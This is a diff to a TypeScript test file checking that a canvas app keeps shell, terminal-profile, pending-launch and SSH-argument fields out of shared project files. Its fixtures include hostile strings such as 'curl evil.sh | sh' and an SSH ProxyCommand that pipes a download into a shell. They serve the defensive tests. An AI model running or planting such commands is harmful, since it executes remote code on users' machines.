@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest'
 import path from 'path'
-import type { CanvasNodeState, Project, Workspace } from '../shared/types'
+import type { CanvasNodeState, PendingLaunch, Project, Workspace } from '../shared/types'
 import {
   toPortableNodes, resolveNodes, projectToFile, fileToProject, framingViewport,
   sameProjectContent, splitWorkspace, serializeProjectFile
@@ -15,6 +15,11 @@ const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
 const project = (over: Partial<Project> = {}): Project => ({
   id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
   nodes: [node()], ...over
+})
+const pendingLaunch = (): PendingLaunch => ({
+  after: ['term-dep-1'],
+  launchId: '123e4567-e89b-42d3-a456-426614174000',
+  launch: { kind: 'agent', action: 'start', agentId: 'claude', prompt: 'local only' }
 })
 
 describe('portable node cwds', () => {
@@ -251,30 +256,63 @@ describe('permission mode persistence', () => {
 
 describe('exec-enabling node fields never travel in the shared project file', () => {
   const hostileNodes = [
-    node({ id: 'n1', shell: 'curl evil.sh | sh' }),
+    node({
+      id: 'n1',
+      shell: 'curl evil.sh | sh',
+      terminalProfileId: 'wsl:Foreign Distro',
+      pendingLaunch: {
+        after: ['term-dep-1'], command: 'curl legacy-shared-command.test | sh'
+      } as unknown as PendingLaunch
+    }),
     node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
   ]
 
-  it('projectToFile strips shell + ssh.extraArgs (a teammate who clones gets no command)', () => {
+  it('projectToFile strips shell + profile + pending launch + ssh.extraArgs from the shared file', () => {
     const file = projectToFile(project({ cwd: '/a/b', nodes: hostileNodes }), 1, 'now')
     expect(file.nodes[0].shell).toBeUndefined()
+    expect(file.nodes[0].terminalProfileId).toBeUndefined()
+    expect(file.nodes[0].pendingLaunch).toBeUndefined()
     expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
     expect(serializeProjectFile(file)).not.toContain('ProxyCommand')
+    expect(serializeProjectFile(file)).not.toContain('Foreign Distro')
+    expect(serializeProjectFile(file)).not.toContain('legacy-shared-command')
     // the connection itself still persists (a node must reattach to its host)
     expect(file.nodes[1].ssh?.host).toBe('h')
+  })
+
+  it('serializeProjectFile strips a hostile parsed/cache object that bypassed projectToFile', () => {
+    const hostile = {
+      ...projectToFile(project({ nodes: [] }), 1, 'now'),
+      nodes: hostileNodes
+    }
+    const serialized = serializeProjectFile(hostile)
+    const parsed = JSON.parse(serialized)
+    expect(parsed.nodes[0].shell).toBeUndefined()
+    expect(parsed.nodes[0].terminalProfileId).toBeUndefined()
+    expect(parsed.nodes[0].pendingLaunch).toBeUndefined()
+    expect(parsed.nodes[1].ssh.extraArgs).toBeUndefined()
+    expect(serialized).not.toContain('Foreign Distro')
+    expect(serialized).not.toContain('ProxyCommand')
   })
 
   it('fileToProject with no local overlay drops what the FILE claimed (adopted/cloned folder)', () => {
     const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
     const p = fileToProject(f, { id: 'p1', cwd: '/a/b' })
     expect(p.nodes[0].shell).toBeUndefined()
+    expect(p.nodes[0].terminalProfileId).toBeUndefined()
+    expect(p.nodes[0].pendingLaunch).toBeUndefined()
     expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
   })
 
   it("fileToProject restores only THIS machine's values (from the local index entry)", () => {
     const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
-    const p = fileToProject(f, { id: 'p1', cwd: '/a/b', localExec: { n1: { shell: '/bin/zsh' } } })
+    const p = fileToProject(f, {
+      id: 'p1',
+      cwd: '/a/b',
+      localExec: { n1: { shell: '/bin/zsh', terminalProfileId: 'windows-powershell' } }
+    })
     expect(p.nodes[0].shell).toBe('/bin/zsh')
+    expect(p.nodes[0].terminalProfileId).toBe('windows-powershell')
     expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
   })
 
@@ -282,7 +320,12 @@ describe('exec-enabling node fields never travel in the shared project file', ()
     const p = project({
       cwd: '/a/b',
       nodes: [
-        node({ id: 'n1', shell: '/bin/zsh' }),
+        node({
+          id: 'n1',
+          shell: '/bin/zsh',
+          terminalProfileId: 'wsl:Ubuntu 24.04',
+          pendingLaunch: pendingLaunch()
+        }),
         // execTrusted: the local producer (the user's SSH server store) set this value — see
         // @shared/node-exec. Without the marker an exec-enabling arg is NOT blessed into the
         // machine-local index (the case below), which is what stops a canvas-sync peer from
@@ -296,15 +339,21 @@ describe('exec-enabling node fields never travel in the shared project file', ()
     const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
     const { index, files } = splitWorkspace(ws, () => 1, 'now')
     expect(index.entries[0].localExec).toEqual({
-      n1: { shell: '/bin/zsh' },
+      n1: {
+        shell: '/bin/zsh', terminalProfileId: 'wsl:Ubuntu 24.04', pendingLaunch: pendingLaunch()
+      },
       n2: { sshExtraArgs: '-o ProxyCommand=corp %h' }
     })
     const file = files.get('/a/b')!
     expect(file.nodes[0].shell).toBeUndefined()
+    expect(file.nodes[0].terminalProfileId).toBeUndefined()
+    expect(file.nodes[0].pendingLaunch).toBeUndefined()
     expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
     // and the round trip through the index restores them for the local user
     const back = fileToProject(file, { id: 'p1', cwd: '/a/b', localExec: index.entries[0].localExec })
     expect(back.nodes[0].shell).toBe('/bin/zsh')
+    expect(back.nodes[0].terminalProfileId).toBe('wsl:Ubuntu 24.04')
+    expect(back.nodes[0].pendingLaunch).toEqual(pendingLaunch())
     expect(back.nodes[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
   })
 
